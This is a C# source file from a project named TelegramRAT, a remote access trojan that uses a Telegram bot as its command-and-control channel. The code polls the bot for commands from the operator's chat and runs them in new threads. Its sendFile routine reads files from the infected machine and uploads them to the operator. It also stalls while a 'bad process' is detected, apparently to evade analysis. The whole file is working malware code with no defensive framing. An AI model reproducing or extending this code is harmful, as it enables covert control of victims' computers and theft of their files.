using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using SimpleJSON;

namespace TelegramRAT
{
    internal class telegram
    {
        // Thread
        public static Thread waitCommandsThread = new Thread(waitCommands);
        // Thread is blocked
        public static bool waitThreadIsBlocked = false;
     

        // If is blocked - wait
        private static void waitForUnblock()
        {
            while (true)
            {
                // If detected bad process
                if (waitThreadIsBlocked)
                {
                    Thread.Sleep(200);
                    continue;
                } else
                {
                    break;
                }
            }
        }


        // Wait commands
        private static void waitCommands()
        {
            waitForUnblock();
            // Get last update id
            int LastUpdateID = 0;
            string response;
            using (WebClient client = new WebClient())
                response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates");
            LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;

            // Get commands
            while (true)
            {
                // Sleep
                Thread.Sleep(config.TelegramCommandCheckDelay * 50);
                //
                waitForUnblock();
                // Get commands
                LastUpdateID++;
                using (WebClient client = new WebClient())
                    response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates?offset={LastUpdateID}");
                var json = JSON.Parse(response);

                foreach (JSONNode r in json["result"].AsArray)
                {
                    JSONNode message = r["message"];
                    string chatid = message["chat"]["id"];
                    LastUpdateID = r["update_id"].AsInt;

                    // If not the creator of the bot writes
                    if (chatid != config.TelegramChatID)
                    {
                        string username = message["chat"]["username"];
                        string firstname = message["chat"]["first_name"];
                        sendText($"👑 You not my owner {firstname}", chatid);
                        sendText($"👑 Unknown user with id {chatid} and username @{username} send command to bot!");
                        break;
                    }
                    // Download file from chat to computer
                    if (message.HasKey("document"))
                    {
                        // Get document info
                        string fileName = message["document"]["file_name"];
                        string fileID = message["document"]["file_id"];
                        JSONNode filePath;
                        // Get file path
                        using (WebClient client = new WebClient())
                        {
                            filePath = JSON.Parse(client.DownloadString(
                                "https://api.telegram.org/bot" +
                                config.TelegramToken +
                                "/getFile" +
                                "?file_id=" + fileID
                            ))["result"]["file_path"];
                        }
                    }
                    // Run command
                    else if (message.HasKey("text"))
                    {
                        string command = message["text"];
                        // Check if it's command
                        if (!command.StartsWith("/")) { continue; }
                        // Execute command in new thread
                        Thread t = new Thread(() => commands.handle(command));
                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                    }
                    else
                    {
                        sendText("🍩 Unknown type received. Only Text/Document can be used!");
                    }
                }
            }
        }

        public static void sendFile(string file, string type = "Document")
        {
            waitForUnblock();
            // If is file
            if (!File.Exists(file))
            {
                sendText("⛔ File not found!");
                return;
            }
            // Send file
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent fform = new MultipartFormDataContent();
                var file_bytes = File.ReadAllBytes(file);
                fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
                var rresponse = httpClient.PostAsync(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/send" + type +
                    "?chat_id=" + config.TelegramChatID,
                    fform
                );
                rresponse.Wait();
                httpClient.Dispose();
            }
        }

        // Send text
        public static void sendText(string text, string chatID = config.TelegramChatID)
        {
            waitForUnblock();
            using (WebClient client = new WebClient())
            {
                client.DownloadString(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/sendMessage" +
                    "?chat_id=" + chatID +
                    "&text=" + text
                );
            }
        }


        
        // Send connected
        public static void sendConnection()
        {
            sendText("🍀 Bot connected");
        }

        
    }
}
